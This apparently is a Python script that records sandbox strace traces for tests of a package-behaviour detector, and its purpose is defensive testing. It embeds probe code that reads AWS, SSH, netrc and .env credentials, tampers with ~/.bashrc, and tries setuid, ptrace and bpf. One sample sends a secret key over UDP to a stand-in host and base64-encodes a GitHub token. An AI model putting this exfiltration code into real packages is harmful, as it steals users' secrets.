"""Record the real sandbox traces that tests/test_cavr_sandbox_events.py reads (PR 7 of docs/cavr-m2-plan.md).

    CAVR_DOCKER=1 .venv/bin/python tests/test_cavr_data/traces/record_events.py [stem ...]

With stems (e.g. `events-scoped`) only those recordings are made again; without, all of them.

Each recording is one real run of `sandbox_observe.observe` (or `run_harness` for the empty baseline) in
asent-cavr-sandbox:local, written as <name>.txt (the trace, strace's stderr) and <name>.json (what produced it). The
marker nonce is fixed for the recording so that the unit tests can check the trace again; nothing else is changed.
"""
from __future__ import annotations

import hashlib
import json
import subprocess
import sys
import tempfile
from datetime import date
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT))

from backend.cavr import sandbox_image, sandbox_observe  # noqa: E402
from tests.test_cavr_support import build_wheel  # noqa: E402

HERE = Path(__file__).resolve().parent
NONCE = "0123456789abcdef0123456789abcdef"

# One import that does every behaviour the normaliser must type, each attempt caught so the run completes.
PROBE = r'''
import ctypes, os, socket, subprocess, threading
def attempt(f):
    try: f()
    except Exception as exc: print("attempt:", type(exc).__name__, exc)
attempt(lambda: socket.create_connection(("198.51.100.24", 443), timeout=1))
attempt(lambda: socket.socket(socket.AF_INET6).connect(("2001:db8::1", 443)))
attempt(lambda: socket.socket(socket.AF_UNIX).connect("/run/cavr-probe.sock"))
attempt(lambda: socket.getaddrinfo("example.com", 80))
attempt(lambda: socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b"x", ("203.0.113.5", 53)))
attempt(lambda: socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendmsg([b"x"], [], 0, ("203.0.113.6", 9)))
attempt(lambda: open(os.path.expanduser("~/.aws/credentials")).read())
attempt(lambda: os.stat(os.path.expanduser("~/.ssh/id_rsa")))
attempt(lambda: open("/etc/passwd").read())
attempt(lambda: os.chdir("/tmp"))
attempt(lambda: open(".env").read())
attempt(lambda: open("rel.txt", "w").write("x"))
fd = os.open("/tmp", os.O_RDONLY)
attempt(lambda: os.fchdir(fd))
attempt(lambda: open("rel2.txt", "w").write("x"))
attempt(lambda: os.open("rel3.txt", os.O_RDONLY, dir_fd=fd))
attempt(lambda: os.rename("/tmp/rel.txt", "/tmp/rel4.txt"))
attempt(lambda: os.unlink("/tmp/rel4.txt"))
attempt(lambda: os.mkdir("/tmp/d"))
attempt(lambda: open(os.path.expanduser("~/.bashrc"), "a"))
attempt(lambda: subprocess.run(["/bin/sh", "-c", "true"]))
attempt(lambda: os.setuid(0))
attempt(lambda: open("/" + "a" * 4000))
libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
print("ptrace", libc.ptrace(0, 0, None, None))
print("bpf", libc.syscall(321, 0, None, 0))
th = threading.Thread(target=lambda: None); th.start(); th.join()
pid = os.fork()
if pid == 0:
    try: open("child.txt")
    except Exception: pass
    os._exit(0)
os.waitpid(pid, 0)
'''
BENIGN = "def run():\n    return 1\n"
# A connect at import time, to the one endpoint a scoped grant names (NETWORK_CONNECT:198.51.100.24:443): the sink
# that escalates the package runs in the import and stays inside the contract (step M2-14, Maryam's decision).
SCOPED = ("import socket\n\ntry:\n    socket.create_connection(('198.51.100.24', 443), timeout=1)\nexcept OSError:\n"
          "    pass\n\n\ndef run():\n    return 1\n")


class FixedNonce:
    @staticmethod
    def token_hex(n):
        return NONCE


def observe(name, files):
    quarantine = Path(tempfile.mkdtemp(prefix="cavr-record-"))
    wheel = build_wheel(quarantine, name, "1.0", files=files)
    node = {"name": name, "version": "1.0", "filename": wheel.name, "path": str(wheel),
            "sha256": hashlib.sha256(wheel.read_bytes()).hexdigest()}
    return sandbox_observe.observe([node], [name], quarantine_dir=quarantine), [node]


def save(stem, result, steps, produced_by, wheels=None):
    (HERE / f"{stem}.txt").write_text(result["trace"], encoding="utf-8")
    meta = {"file": f"{stem}.txt", "recorded": date.today().isoformat(), "produced_by": produced_by,
            "rule": result["rule"], "nonce": NONCE, "steps": steps, "image_id": result["evidence"].get("image_id"),
            "seccomp_sha256": result["evidence"].get("seccomp_sha256"),
            "harness_sha256": result["evidence"].get("harness_sha256"), "strace": result["evidence"].get("strace"),
            "trace_sha256": hashlib.sha256(result["trace"].encode()).hexdigest(), "wheels": wheels or [],
            "docker": subprocess.run(["docker", "version", "--format", "{{.Server.Version}}"], capture_output=True,
                                     text=True).stdout.strip(),
            "note": "the marker nonce was fixed for the recording"}
    (HERE / f"{stem}.json").write_text(json.dumps(meta, indent=2) + "\n", encoding="utf-8")
    print(stem, result["rule"], result["evidence"].get("trace_lines"))


def record_wheel(stem, name, code, what):
    steps = sandbox_observe.install_steps([name])
    result, nodes = observe(name, {f"{name}/__init__.py": code})
    save(stem, result, steps, f"sandbox_observe.observe: wheel {name} 1.0 {what}", nodes)


def record_baseline():
    steps = [sandbox_observe.step("imports", sandbox_observe.IMPORT_ARGV)]
    result = sandbox_observe.run_harness(steps, tmpfs=[sandbox_observe.SITE_TMPFS])
    save("events-baseline", result, steps, "sandbox_observe.run_harness: the empty-harness baseline (imports, no module)")


# PR 11: one spec run whose import leaks four canaries in four ways (a UDP sendto, base64 in a write, a writev, an
# abstract Unix socket name) and writes 70000 bytes (cut by strace -s 65536); and one clean spec run. The canaries
# are the run's own random values; the .json keeps the spec with them so the tests can check the trace again.
LEAK = r'''
import base64, os, socket
def attempt(f):
    try: f()
    except Exception as exc: print("attempt:", type(exc).__name__, exc)
home = os.path.expanduser("~")
aws = open(home + "/.aws/credentials").read()
secret = [l.split("=", 1)[1].strip() for l in aws.splitlines() if l.startswith("aws_secret_access_key")][0]
udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
attempt(lambda: udp.sendto(secret.encode(), ("198.51.100.24", 53)))
os.write(1, b"t=" + base64.b64encode(os.environ["GITHUB_TOKEN"].encode()) + b"\n")
password = open(home + "/.netrc").read().split()[-1]
os.writev(1, [b"p=", password.encode(), b"\n"])
api = open(home + "/.env").read().strip().split("=", 1)[1]
attempt(lambda: socket.socket(socket.AF_UNIX).connect("\0" + api))
os.write(1, b"B" * 70000 + b"\n")
'''


def record_spec(stem, name, code, what):
    from backend.cavr import env_synthesis, sandbox_spec
    quarantine = Path(tempfile.mkdtemp(prefix="cavr-record-"))
    wheel = build_wheel(quarantine, name, "1.0", files={f"{name}/__init__.py": code})
    node = {"name": name, "version": "1.0", "filename": wheel.name, "path": str(wheel),
            "sha256": hashlib.sha256(wheel.read_bytes()).hexdigest()}
    spec = env_synthesis.canary_spec()
    result = sandbox_spec.run_spec([node], [name], spec, quarantine_dir=quarantine)
    save(stem, result, result["evidence"]["job_steps"], f"sandbox_spec.run_spec: wheel {name} 1.0 {what}", [node])
    meta = json.loads((HERE / f"{stem}.json").read_text())
    meta["spec"] = spec
    meta["note"] += "; the canaries are the run's own (fake, random) values"
    (HERE / f"{stem}.json").write_text(json.dumps(meta, indent=2) + "\n", encoding="utf-8")


RECORDINGS = {
    "events-probe": lambda: record_wheel("events-probe", "probe", PROBE, "whose import does PROBE"),
    "events-benign": lambda: record_wheel("events-benign", "benign", BENIGN, "(def run(): return 1)"),
    "events-baseline": record_baseline,
    "events-scoped": lambda: record_wheel("events-scoped", "demo", SCOPED, "whose import connects to 198.51.100.24:443"),
    "spec-canary": lambda: record_spec("spec-canary", "leak", LEAK, "under canary_spec(), whose import leaks canaries"),
    "spec-clean": lambda: record_spec("spec-clean", "benign", BENIGN, "under canary_spec() (def run(): return 1)"),
}


def main(stems=None):
    assert sandbox_image.image_identity()["ok"], "build the image first: bash docker/cavr-sandbox/build.sh"
    sandbox_observe.secrets = FixedNonce
    for stem in stems or RECORDINGS:
        RECORDINGS[stem]()


if __name__ == "__main__":
    main(sys.argv[1:])
